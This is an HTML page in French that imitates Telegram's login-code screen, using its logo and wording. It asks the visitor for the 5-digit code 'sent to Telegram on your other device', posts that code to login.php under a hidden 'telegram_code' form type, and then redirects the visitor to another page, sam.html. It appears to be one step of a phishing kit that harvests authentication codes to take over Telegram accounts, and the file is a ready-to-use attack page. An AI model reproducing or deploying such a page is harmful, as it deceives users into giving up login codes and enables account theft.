<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Telegram Code</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px 20px;
      background-color: #fff;
    }

    img {
      width: 120px;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 1.5em;
      margin: 0;
    }

    p {
      color: #666;
    }

    input[type="text"] {
      padding: 10px;
      width: 80%;
      max-width: 300px;
      margin-top: 20px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
    }

    button {
      display: block;
      margin: 20px auto 0;
      padding: 10px 25px;
      font-size: 16px;
      background-color: #0088cc;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #006fa1;
    }
  </style>
</head>
<body>

  <!-- Logo Telegram -->
  <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />

  <h2>Saisissez le code envoyé depuis Telegram.</h2>
  <p>Nous avons envoyé le code à <strong>Telegram</strong>, l'application sur votre autre appareil.</p>

  <!-- Formulaire qui envoie le code -->
  <form action="login.php" method="POST" id="codeForm">
    <input type="hidden" name="form_type" value="telegram_code">
    <input type="text" name="code" placeholder="Code" id="codeInput" required 
           pattern="[0-9]{5}" title="Un code de 5 chiffres"/>
    <button type="submit">Envoyer</button>
  </form>

  <script>
    document.getElementById('codeForm').addEventListener('submit', function(e) {
      // Validation supplémentaire
      if (!this.checkValidity()) {
        e.preventDefault();
        return;
      }
      
      // Envoi synchrone du formulaire avant redirection
      setTimeout(function() {
        window.location.href = "sam.html";
      }, 300); // Délai augmenté pour garantir l'envoi
    });
  </script>
</body>
</html>
